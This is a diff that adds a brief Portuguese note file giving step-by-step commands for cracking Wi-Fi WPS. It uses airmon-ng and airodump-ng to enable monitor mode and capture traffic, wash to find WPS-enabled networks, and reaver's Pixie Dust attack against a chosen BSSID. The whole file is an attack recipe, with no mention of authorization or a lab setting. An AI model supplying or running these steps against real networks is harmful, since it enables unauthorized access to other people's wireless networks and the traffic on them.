@@ -1,0 +1,21 @@
+Linha de comando:
+
+Mostrando dispositivos de rede:
+
+# ifconfig
+
+Ativando interface de monitoramento:
+
+# airmon-ng start wlan0
+
+Monitorando o ar:
+
+# airodump-ng wlan0mon
+
+Encontrando redes com WPS ativo usando Wash
+
+# wash -i wlan0mon
+
+Quebrando a WPS com Reaver utilizando Pixie Dust
+
+# reaver -K 1 -b <bssid> -i wlan0mon
